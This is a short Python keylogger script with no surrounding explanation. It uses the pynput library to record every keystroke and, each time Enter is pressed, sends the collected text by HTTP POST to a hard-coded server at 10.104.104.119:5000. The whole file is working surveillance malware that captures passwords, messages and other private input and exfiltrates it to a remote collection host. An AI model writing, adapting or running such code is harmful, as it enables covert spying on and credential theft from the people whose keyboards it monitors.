from pynput.keyboard import Listener, Key
import requests

server_url = 'http://10.104.104.119:5000/get_logs'
logs = ''

def on_press(key):
    global logs

    if key == Key.enter:
        try:
            requests.post(server_url, data={'logs': logs})
        except:
            print('Server error!')

        logs = ''
    else:
        a = str(key).replace("'","")
        if a in 'Key':
            a = ' '+a+' '
        logs += a

with Listener(on_press=on_press) as listener:
    listener.join()